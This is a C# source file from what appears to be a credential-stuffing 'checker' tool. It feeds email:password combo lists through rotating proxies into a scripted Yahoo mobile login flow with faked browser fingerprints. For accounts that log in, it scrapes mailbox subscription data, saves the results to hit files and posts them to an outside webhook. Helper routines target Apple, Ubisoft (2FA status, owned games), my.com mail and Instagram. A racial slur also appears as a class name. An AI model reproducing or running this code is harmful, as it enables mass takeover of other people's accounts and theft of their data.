using System; using Galaxy.Mainm;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Web;
using AuthGG;
using Leaf.xNet;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using ZuttPal;
using Console = Colorful.Console;
namespace ZuttPal
{
	internal class Yahoo3kek
	{
		public static string Path;
		private static ReaderWriterLockSlim locker = new ReaderWriterLockSlim();
		public static void startchecker1()
		{
			for (; ; )
			{
				while (!Yahoo3check.Combo.IsEmpty)
				{
					using (Leaf.xNet.HttpRequest httpRequest = new Leaf.xNet.HttpRequest())
					{
						if (Yahoo3check.Combo.TryDequeue(out string acc))
						{
							try
							{
								var array = acc.Split(new char[3] { ':', ';', '|' });
								var email = array[0];
								var password = array[1];
								string account = email + ":" + password;
								httpRequest.IgnoreProtocolErrors = true;
								httpRequest.KeepAlive = true;
								httpRequest.ConnectTimeout = Program.config.timeout;
								httpRequest.IgnoreProtocolErrors = true;
								if (Program.config.proxytype.ToUpper() == "PROXYLESS") { string hora = "MK";  } else httpRequest.Proxy = Yahoo3check.RandomProxies();
								string text4 = WebUtility.UrlEncode(password ?? "");
								string text5 = WebUtility.UrlEncode(email ?? "");
								httpRequest.AddHeader("Connection", "keep-alive");
								httpRequest.AddHeader("Upgrade-Insecure-Requests", "1");
								httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Linux; Android 5.1.1; SM-G965N Build/R16NW.G965NKSU1ARC7; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.136 Mobile Safari/537.36");
								httpRequest.AddHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3");
								httpRequest.AddHeader("Accept-Encoding", "gzip, deflate");
								httpRequest.AddHeader("Accept-Language", "en-US,en;q=0.9");
								httpRequest.AddHeader("X-Requested-With", "com.yahoo.mobile.client.android.mail");
								string input = httpRequest.Get("https://login.yahoo.com/?done=https%3A%2F%2Fapi.login.yahoo.com%2Foauth2%2Frequest_auth%3Fappid%3Dcom.yahoo.mobile.client.android.mail%26appsrcv%3D6.8.5%26src%3Dandroidphnx%26srcv%3D8.7.2%26intl%3Dus%26language%3Den-US%26sdk-device-id%3DODg2ODI4MDJlNGJlYzk4MjBkOTc5ZWRiMTA1Y2MyYWI1NWY1ZWU0Yjgz%26push%3D1%26.asdk_embedded%3D1%26theme%3Dlight%26redirect_uri%3Dcom.yahoo.mobile.client.android.mail%253A%252F%252Fphoenix%252Fcallback_auth%26client_id%3DnkjqLcZOZkjomfDS%26response_type%3Dcode%26state%3DZliubzGgAP1vTQu2UDaFuQ%26scope%3Dsdct-w%2520mail-w%2520sdpp-w%2520openid%2520device_sso%26code_challenge%3D2sP2GFXmZO5SN7yfyoK7DQIVWXb6UU19D_kmrwtG6DI%26code_challenge_method%3DS256%26nonce%3D9zH8cvQvM5tJDXWkw3rItI68TXAr3O13%26webview%3D1%26.scrumb%3D0&src=androidphnx&crumb=YhP68XDbqj4&redirect_uri=com.yahoo.mobile.client.android.mail%3A%2F%2Fphoenix%2Fcallback_auth&lang=en-US&intl=us&theme=light&add=1&client_id=nkjqLcZOZkjomfDS&appsrc=ymobilemail&appid=com.yahoo.mobile.client.android.mail&appsrcv=6.8.5&language=en-US&srcv=8.7.2&.asdk_embedded=1").ToString();
								string text6 = Functions.LR(input, "<input type=\"hidden\" name=\"acrumb\" value=\"", "\"").FirstOrDefault();
								string text7 = Functions.LR(input, "<input type=\"hidden\" name=\"sessionIndex\" value=\"", "\"").FirstOrDefault();
								httpRequest.AddHeader("Connection", "keep-alive");
								httpRequest.AddHeader("Origin", "https://login.yahoo.com");
								httpRequest.AddHeader("X-Requested-With", "XMLHttpRequest");
								httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Linux; Android 5.1.1; SM-G965N Build/R16NW.G965NKSU1ARC7; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.136 Mobile Safari/537.36");
								httpRequest.AddHeader("content-type", "application/x-www-form-urlencoded; charset=UTF-8");
								httpRequest.AddHeader("Accept", "*/*");
								httpRequest.AddHeader("Referer", "https://login.yahoo.com/?done=https%3A%2F%2Fapi.login.yahoo.com%2Foauth2%2Frequest_auth%3Fappid%3Dcom.yahoo.mobile.client.android.mail%26appsrcv%3D6.8.5%26src%3Dandroidphnx%26srcv%3D8.7.2%26intl%3Dus%26language%3Den-US%26sdk-device-id%3DODg2ODI4MDJlNGJlYzk4MjBkOTc5ZWRiMTA1Y2MyYWI1NWY1ZWU0Yjgz%26push%3D1%26.asdk_embedded%3D1%26theme%3Dlight%26redirect_uri%3Dcom.yahoo.mobile.client.android.mail%253A%252F%252Fphoenix%252Fcallback_auth%26client_id%3DnkjqLcZOZkjomfDS%26response_type%3Dcode%26state%3DZliubzGgAP1vTQu2UDaFuQ%26scope%3Dsdct-w%2520mail-w%2520sdpp-w%2520openid%2520device_sso%26code_challenge%3D2sP2GFXmZO5SN7yfyoK7DQIVWXb6UU19D_kmrwtG6DI%26code_challenge_method%3DS256%26nonce%3D9zH8cvQvM5tJDXWkw3rItI68TXAr3O13%26webview%3D1%26.scrumb%3D0&src=androidphnx&crumb=YhP68XDbqj4&redirect_uri=com.yahoo.mobile.client.android.mail%3A%2F%2Fphoenix%2Fcallback_auth&lang=en-US&intl=us&theme=light&add=1&client_id=nkjqLcZOZkjomfDS&appsrc=ymobilemail&appid=com.yahoo.mobile.client.android.mail&appsrcv=6.8.5&language=en-US&srcv=8.7.2&.asdk_embedded=1");
								httpRequest.AddHeader("Accept-Encoding", "gzip, deflate");
								httpRequest.AddHeader("Accept-Language", "en-US,en;q=0.9");
								string text8 = httpRequest.Post("https://login.yahoo.com/?done=https%3A%2F%2Fapi.login.yahoo.com%2Foauth2%2Frequest_auth%3Fappid%3Dcom.yahoo.mobile.client.android.mail%26appsrcv%3D6.8.5%26src%3Dandroidphnx%26srcv%3D8.7.2%26intl%3Dus%26language%3Den-US%26sdk-device-id%3DODg2ODI4MDJlNGJlYzk4MjBkOTc5ZWRiMTA1Y2MyYWI1NWY1ZWU0Yjgz%26push%3D1%26.asdk_embedded%3D1%26theme%3Dlight%26redirect_uri%3Dcom.yahoo.mobile.client.android.mail%253A%252F%252Fphoenix%252Fcallback_auth%26client_id%3DnkjqLcZOZkjomfDS%26response_type%3Dcode%26state%3DZliubzGgAP1vTQu2UDaFuQ%26scope%3Dsdct-w%2520mail-w%2520sdpp-w%2520openid%2520device_sso%26code_challenge%3D2sP2GFXmZO5SN7yfyoK7DQIVWXb6UU19D_kmrwtG6DI%26code_challenge_method%3DS256%26nonce%3D9zH8cvQvM5tJDXWkw3rItI68TXAr3O13%26webview%3D1%26.scrumb%3D0&src=androidphnx&crumb=" + text6 + "&redirect_uri=com.yahoo.mobile.client.android.mail%3A%2F%2Fphoenix%2Fcallback_auth&lang=en-US&intl=us&theme=light&add=1&client_id=nkjqLcZOZkjomfDS&appsrc=ymobilemail&appid=com.yahoo.mobile.client.android.mail&appsrcv=6.8.5&language=en-US&srcv=8.7.2&.asdk_embedded=1", "acrumb=" + text6 + "&sessionIndex=" + text7 + "&username=" + email + "&passwd=&signin=Next&persistent=y", "application/x-www-form-urlencoded; charset=UTF-8").ToString();
								if (text8.Contains("location\":\""))
								{
									string str = Functions.LR(text8, "location\":\"", "\"").FirstOrDefault();
									httpRequest.AllowAutoRedirect = false;
									httpRequest.AddHeader("Origin", "https://login.yahoo.com");
									httpRequest.AddHeader("Accept-Encoding", "gzip, deflate, br");
									httpRequest.AddHeader("Connection", "keep-alive");
									httpRequest.AddHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
									httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Mobile/15E148 Safari/604.1");
									httpRequest.AddHeader("Referer", "https://login.yahoo.com/");
									httpRequest.AddHeader("Accept-Language", "en-us");
									Leaf.xNet.HttpResponse httpResponse = httpRequest.Post("https://login.yahoo.com" + str, "browser-fp-data=%7B%22language%22%3A%22en-gb%22%2C%22colorDepth%22%3A32%2C%22deviceMemory%22%3A%22unknown%22%2C%22pixelRatio%22%3A2%2C%22hardwareConcurrency%22%3A%22unknown%22%2C%22timezoneOffset%22%3A-120%2C%22timezone%22%3A%22Europe%2FZagreb%22%2C%22sessionStorage%22%3A1%2C%22localStorage%22%3A1%2C%22indexedDb%22%3A1%2C%22cpuClass%22%3A%22unknown%22%2C%22platform%22%3A%22iPhone%22%2C%22doNotTrack%22%3A%22unknown%22%2C%22plugins%22%3A%7B%22count%22%3A0%2C%22hash%22%3A%2224700f9f1986800ab4fcc880530dd0ed%22%7D%2C%22canvas%22%3A%22canvas+winding%3Ayes%7Ecanvas%22%2C%22webgl%22%3A1%2C%22webglVendorAndRenderer%22%3A%22Apple+Inc.%7EApple+GPU%22%2C%22adBlock%22%3A0%2C%22hasLiedLanguages%22%3A0%2C%22hasLiedResolution%22%3A0%2C%22hasLiedOs%22%3A1%2C%22hasLiedBrowser%22%3A0%2C%22touchSupport%22%3A%7B%22points%22%3A5%2C%22event%22%3A1%2C%22start%22%3A1%7D%2C%22fonts%22%3A%7B%22count%22%3A13%2C%22hash%22%3A%22ef5cebb772562bd1af018f7f69d53c9e%22%7D%2C%22audio%22%3A%2235.10893253237009%22%2C%22resolution%22%3A%7B%22w%22%3A%22375%22%2C%22h%22%3A%22667%22%7D%2C%22availableResolution%22%3A%7B%22w%22%3A%22667%22%2C%22h%22%3A%22375%22%7D%2C%22ts%22%3A%7B%22serve%22%3A1602267366727%2C%22render%22%3A1602267367187%7D%7D&crumb=u59YPxnhpU4&acrumb=" + text6 + "&sessionIndex=" + text7 + "&displayName=" + text5 + "&passwordContext=normal&password=" + text4 + "&verifyPassword=Next", "application/x-www-form-urlencoded");
									string text9 = httpResponse.ToString();
									string text10 = Functions.LR(httpResponse["Location"].ToString(), "", "").FirstOrDefault();
									if (text9.Contains("Redirecting to <a href=\"https://api.login.yahoo.com/oauth2/request_auth") && !text9.Contains("Redirecting to <a href=\"/account/challenge/password"))
									{
										if (niggers.capture == 1)
										{
											httpRequest.ClearAllHeaders();
											httpRequest.AllowAutoRedirect = false;
											httpRequest.AddHeader("user-agent", "Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/87.0.4280.77 Mobile/18C66 Safari/604.1");
											httpRequest.AddHeader("accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
											httpRequest.AddHeader("accept-language", "ach,en-GB;q=0.8,en-US;q=0.5,en;q=0.3");
											httpRequest.AddHeader("accept-encoding", "br, gzip, deflate");
											httpRequest.AddHeader("dnt", "1");
											httpRequest.AddHeader("upgrade-insecure-requests", "1");
											string pre = httpRequest.Get("https://mail.yahoo.com/m/?.src=ym&reason=mobile").ToString();

											var MBOXID = Functions.LR(pre, "\"selectedMailbox\":{\"id\":\"", "\"").FirstOrDefault();
											var WSSID = Functions.LR(pre, "\"mailWssid\":\"", "\"").FirstOrDefault();
											var APPID = Functions.LR(pre, "\"appId\":\"", "\"").FirstOrDefault();
											var YMREQID = Guid.NewGuid().ToString();
											var EMAIL = WebUtility.UrlEncode(email);

											httpRequest.ClearAllHeaders();
											httpRequest.AllowAutoRedirect = false;
											httpRequest.AddHeader("user-agent", "Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/87.0.4280.77 Mobile/18C66 Safari/604.1");
											httpRequest.AddHeader("accept", "application/json");
											httpRequest.AddHeader("accept-language", "ach,en-GB;q=0.8,en-US;q=0.5,en;q=0.3");
											httpRequest.AddHeader("accept-encoding", "gzip, deflate, br");
											httpRequest.AddHeader("referer", "https://mail.yahoo.com/");
											httpRequest.AddHeader("origin", "https://mail.yahoo.com");
											httpRequest.AddHeader("dnt", "1");
											string capture_subs = httpRequest.Get($"https://data.mail.yahoo.com/f/subscription/email/brand?acctid=1&mboxid={MBOXID}&wssid={WSSID}&appid={APPID}&ymreqid={YMREQID}&email={EMAIL}&sort=score.desc").ToString();

											var subcount = Functions.JSON(capture_subs, "count").FirstOrDefault();
											var subs = string.Join(Environment.NewLine, Functions.LR(capture_subs, "\"name\":\"", "\",\"score\":", true));
											lock (Program.WriteLock)
											{
												Interlocked.Increment(ref Yahoo3check.CheckedLines); Interlocked.Increment(ref stats.checcc);
												Interlocked.Increment(ref Yahoo3check.currentCpm); Interlocked.Increment(ref stats.currentCpm);
												Interlocked.Increment(ref Yahoo3check.Hits); Interlocked.Increment(ref stats.hits);
												string capppp = $"{account} - Subscriptions: {subs} - Subscriptions Count: {subcount}";
												if (Program.config.showgood == "True" && Program.config.ui == 2)
												{
													Colorful.Console.WriteLine("[»] Valid " + capppp, Color.Green);
												}
												if (Program.config.hitstowebhook == "True") { string data1 = "{\"username\": \"Hit Sender\",\"embeds\":[    {\"description\":\"[+] Hit: " + account + "\", \"title\":\"" + Checking.currentrun + "\", \"color\":1018364}]  }"; string hitsend = httpRequest.Post(Program.config.webhook, data1, "application/json").ToString();}Save(Path + "\\Valid.txt", account);
												string yea = $"==========================================" + Environment.NewLine + account + Environment.NewLine + "====================SUBS==================" + Environment.NewLine + subs + Environment.NewLine + $"Total Subscriptions: {subcount}" + Environment.NewLine;
												if (Program.config.hitstowebhook == "True") { string data1 = "{\"username\": \"Hit Sender\",\"embeds\":[    {\"description\":\"[+] Hit: " + account + "\", \"title\":\"" + Checking.currentrun + "\", \"color\":1018364}]  }"; string hitsend = httpRequest.Post(Program.config.webhook, data1, "application/json").ToString();}Save(Path + "\\Capture.txt", yea);
											}
											break;

										}
										else
										{
											lock (Program.WriteLock)
											{
												Interlocked.Increment(ref Yahoo3check.CheckedLines); Interlocked.Increment(ref stats.checcc);
												Interlocked.Increment(ref Yahoo3check.currentCpm); Interlocked.Increment(ref stats.currentCpm);
												Interlocked.Increment(ref Yahoo3check.Hits); Interlocked.Increment(ref stats.hits);
												if (Program.config.showgood == "True" && Program.config.ui == 2)
												{
													Colorful.Console.WriteLine("[»] Valid " + account, Color.Green);
												}
												if (Program.config.hitstowebhook == "True") { string data1 = "{\"username\": \"Hit Sender\",\"embeds\":[    {\"description\":\"[+] Hit: " + account + "\", \"title\":\"" + Checking.currentrun + "\", \"color\":1018364}]  }"; string hitsend = httpRequest.Post(Program.config.webhook, data1, "application/json").ToString();}Save(Path + "\\Valid.txt", account);
											}
											break;
										}
									}
									else if (!text9.Contains("/account/challenge/password") && !text9.Contains("Redirecting to <a href=\"/account/challenge/fail"))
									{
										if (!text10.Contains("https://login.yahoo.com/account/challenge/email-verify") && !text10.Contains("https://login.yahoo.com/account/challenge/push") && !text9.Contains("Redirecting to <a href=\"/account/challenge/challenge-selector"))
										{
											lock (Program.WriteLock)
											{
												Interlocked.Increment(ref Yahoo3check.CheckedLines); Interlocked.Increment(ref stats.checcc);
												Interlocked.Increment(ref Yahoo3check.currentCpm); Interlocked.Increment(ref stats.currentCpm);
												Interlocked.Increment(ref Yahoo3check.Bad); Interlocked.Increment(ref stats.bad);
												if (Program.config.showbad == "True" && Program.config.ui == 2)
												{
													Colorful.Console.WriteLine("[»] Invalid " + account, Color.Red);
												}
												Save(Path + "\\Invalid.txt", account);
											}
											break;
										}
										else
										{
											lock (Program.WriteLock)
											{
												Interlocked.Increment(ref Yahoo3check.CheckedLines); Interlocked.Increment(ref stats.checcc);
												Interlocked.Increment(ref Yahoo3check.currentCpm); Interlocked.Increment(ref stats.currentCpm);
												Interlocked.Increment(ref Yahoo3check.custom);
												if (Program.config.showlocked == "True" && Program.config.ui == 2)
												{
													Colorful.Console.WriteLine("[»] Custom " + account, Color.LightPink);
												}
												Save(Path + "\\Customs.txt", account);
											}
											break;
										}
									}
									else
                                    {
										string acc1 = email + ":" + password;
										Yahoo3check.Combo.Enqueue(acc1);
										Interlocked.Increment(ref Yahoo3check.retry);
									}
								}
								else if (!text8.Contains("error\":\"messages.INVALID_USERNAME"))
								{
									string acc1 = email + ":" + password;
									Yahoo3check.Combo.Enqueue(acc1);
									Interlocked.Increment(ref Yahoo3check.retry);
								}
								else
								{
									string acc1 = email + ":" + password;
									Yahoo3check.Combo.Enqueue(acc1);
									Interlocked.Increment(ref Yahoo3check.retry);
								}
							}
							catch (Exception)
							{
								var array = acc.Split(new char[3] { ':', ';', '|' });
								var email = array[0];
								var password = array[1];
								var account = email + password;
								string acc1 = email + ":" + password;
								Yahoo3check.Combo.Enqueue(acc1);
								Interlocked.Increment(ref Yahoo3check.retry);
							}
						}
					}
				}
			}
		}
		private readonly Random _random = new Random();
		private static string RandomString(int length)
		{
			const string pool = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
			var builder = new StringBuilder();

			for (var i = 0; i < length; i++)
			{
				var c = pool[random.Next(0, pool.Length)];
				builder.Append(c);
			}

			return builder.ToString();
		}
		static string AppleGetToken(ref CookieStorage cookies)
		{
			while (true)
			{
				try
				{
					using (Leaf.xNet.HttpRequest httpRequest = new Leaf.xNet.HttpRequest())
					{
						if (Program.config.proxytype.ToUpper() == "PROXYLESS") { string hora = "MK";  } else httpRequest.Proxy = Yahoo3check.RandomProxies();
						cookies = new CookieStorage();
						httpRequest.Cookies = cookies;
						httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36";
						httpRequest.AddHeader("Accept", "*/*");

						string strResponse = httpRequest.Get(new Uri("https://secure4.store.apple.com/shop/sign_in?c=aHR0cHM6Ly93d3cuYXBwbGUuY29tL3wxYW9zZTQyMmM4Y2NkMTc4NWJhN2U2ZDI2NWFmYWU3NWI4YTJhZGIyYzAwZQ&r=SCDHYHP7CY4H9XK2H&s=aHR0cHM6Ly93d3cuYXBwbGUuY29tL3wxYW9zZTQyMmM4Y2NkMTc4NWJhN2U2ZDI2NWFmYWU3NWI4YTJhZGIyYzAwZQ")).ToString();

						if (strResponse.Contains("stk\":\""))
						{
							return Regex.Match(strResponse, "stk\":\"(.*?)\"}").Groups[1].Value;
						}
					}
				}
				catch
				{
					Interlocked.Increment(ref Yahoo3check.retry);
				}
			}
		}
			


						public int RandomNumber(int min, int max)
		{
			return _random.Next(min, max);
		}

		static Random random = new Random();
		public string RandomString(int size, bool lowerCase = false)
		{
			var builder = new StringBuilder(size);

			// char is a single Unicode character  
			char offset = lowerCase ? 'a' : 'A';
			const int lettersOffset = 26; // A...Z or a..z: length = 26  

			for (var i = 0; i < size; i++)
			{
				var @char = (char)_random.Next(offset, offset + lettersOffset);
				builder.Append(@char);
			}

			return lowerCase ? builder.ToString().ToLower() : builder.ToString();
		}
		public string RandomPassword()
		{
			var passwordBuilder = new StringBuilder();

			// 4-Digits between 1000 and 9999  
			passwordBuilder.Append(RandomNumber(1000, 9999));

			// 2-Letters upper case  
			passwordBuilder.Append(RandomString(2));
			return passwordBuilder.ToString();
		}
		public static string GetRandomHexNumber(int digits)
		{
			byte[] buffer = new byte[digits / 2];
			random.NextBytes(buffer);
			string result = String.Concat(buffer.Select(x => x.ToString("X2")).ToArray());
			if (digits % 2 == 0)
				return result;
			return result + random.Next(16).ToString("X");
		}
		private static string UPlayHas2FA(string ticket, string sessionId)
		{
			while (true)
			{
				try
				{
					using (Leaf.xNet.HttpRequest req = new Leaf.xNet.HttpRequest())
					{
						req.Proxy = Yahoo3check.RandomProxies();
						req.AddHeader("Ubi-SessionId", sessionId);
						req.AddHeader("Ubi-AppId", "e06033f4-28a4-43fb-8313-6c2d882bc4a6");
						req.Authorization = "Ubi_v1 t=" + ticket;
						string str = req.Get(new Uri("https://public-ubiservices.ubi.com/v3/profiles/me/2fa")).ToString();
						if (str.Contains("active"))
						{
							if (str.Contains("true"))
								return "true";
							if (str.Contains("false"))
								return "false";
						}
					}
				}
				catch
				{
					Interlocked.Increment(ref Yahoo3check.retry);
				}
			}
		}

		private static string UPlayGetGames(string ticket)
		{
			while (true)
			{
				try
				{
					using (Leaf.xNet.HttpRequest req = new Leaf.xNet.HttpRequest())
					{
						req.Proxy = Yahoo3check.RandomProxies();
						req.AddHeader("Ubi-AppId", "e06033f4-28a4-43fb-8313-6c2d882bc4a6");
						req.Authorization = "Ubi_v1 t=" + ticket;
						string input = req.Get(new Uri("https://public-ubiservices.ubi.com/v1/profiles/me/club/aggregation/website/games/owned")).ToString();
						if (input.Contains("[") && input != "[]")
						{
							Match match1 = Regex.Match(input, "\"slug\":\"(.*?)\"");
							Match match2 = Regex.Match(input, "\"platform\":\"(.*?)\"");
							string str1 = "";
							string str2;
							while (true)
							{
								str2 = str1 + "[" + match1.Groups[1].Value + " - " + match2.Groups[1].Value + "]";
								match1 = match1.NextMatch();
								match2 = match2.NextMatch();
								if (!(match1.Groups[1].Value == ""))
									str1 = str2 + ", ";
								else
									break;
							}
							return str2;
						}
					}
				}
				catch
				{
				}
			}
		}

			private static string MailAccessCheck(string email, string password)
		{
			while (true)
			{
				try
				{
					using (Leaf.xNet.HttpRequest httpRequest = new Leaf.xNet.HttpRequest())
					{
						if (Program.config.proxytype.ToUpper() == "PROXYLESS") { string hora = "MK";  } else httpRequest.Proxy = Yahoo3check.RandomProxies();
						httpRequest.UserAgent = "MyCom/12436 CFNetwork/758.2.8 Darwin/15.0.0";
						if (httpRequest.Get(new Uri("https://aj-https.my.com/cgi-bin/auth?timezone=GMT%2B2&reqmode=fg&ajax_call=1&udid=16cbef29939532331560e4eafea6b95790a743e9&device_type=Tablet&mp=iOS¤t=MyCom&mmp=mail&os=iOS&md5_signature=6ae1accb78a8b268728443cba650708e&os_version=9.2&model=iPad%202%3B%28WiFi%29&simple=1&Login=" + email + "&ver=4.2.0.12436&DeviceID=D3E34155-21B4-49C6-ABCD-FD48BB02560D&country=GB&language=fr_FR&LoginType=Direct&Lang=en_FR&Password=" + password + "&device_vendor=Apple&mob_json=1&DeviceInfo=%7B%22Timezone%22%3A%22GMT%2B2%22%2C%22OS%22%3A%22iOS%209.2%22%2C?%22AppVersion%22%3A%224.2.0.12436%22%2C%22DeviceName%22%3A%22iPad%22%2C%22Device?%22%3A%22Apple%20iPad%202%3B%28WiFi%29%22%7D&device_name=iPad&")).ToString().Contains("Ok=1"))
							return "Working";
						break;
					}
				}
				catch
				{
					string acc1 = email + ":" + password;
					Yahoo3check.Combo.Enqueue(acc1);
					Interlocked.Increment(ref Yahoo3check.retry);
				}
			}
			return "";
		}
		private static string InstagramGetCSRF(ref CookieStorage cookies)
		{
			while (true)
			{
				try
				{
					using (Leaf.xNet.HttpRequest httpRequest = new Leaf.xNet.HttpRequest())
					{
						if (Program.config.proxytype.ToUpper() == "PROXYLESS") { string hora = "MK";  } else httpRequest.Proxy = Yahoo3check.RandomProxies();
						httpRequest.IgnoreProtocolErrors = true;
						httpRequest.AllowAutoRedirect = false;
						cookies = new CookieStorage();
						httpRequest.Cookies = cookies;
						httpRequest.UserAgent = "Instagram 25.0.0.26.136 Android (24/7.0; 480dpi; 1080x1920; samsung; SM-J730F; j7y17lte; samsungexynos7870)";
						httpRequest.Get(new Uri("https://i.instagram.com/api/v1/accounts/login/")).ToString();
						return cookies.GetCookies("https://i.instagram.com")["csrftoken"].Value;
					}
				}
				catch
				{
					Interlocked.Increment(ref Yahoo3check.retry);
				}
			}
		}

		public static string yey(string source, string left, string right)
		{
			return source.Split(new string[]
			{
				left
			}, StringSplitOptions.None)[1].Split(new string[]
			{
				right
			}, StringSplitOptions.None)[0];
		}
		public static void Save(string path, string line)
			{
			for (; ; )
			{
				try
				{
					File.AppendAllLines(path ?? "", new List<string>
					{
						line
					}, Encoding.UTF8);
					break;
				}
				catch
				{
				}
			}
		}
		public static string Base64Encode(string plainText) => Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
		public static string uri = "";

		public static string auther = "";

		public static string showbad = "";

		public static string showlocked = "";

		public static List<string> Tokens = new List<string>();

		public static List<string> Urls = new List<string>();

		public static List<string> Auther = new List<string>();

		public static List<ProxyClient> ProxyList = new List<ProxyClient>();
	}
}
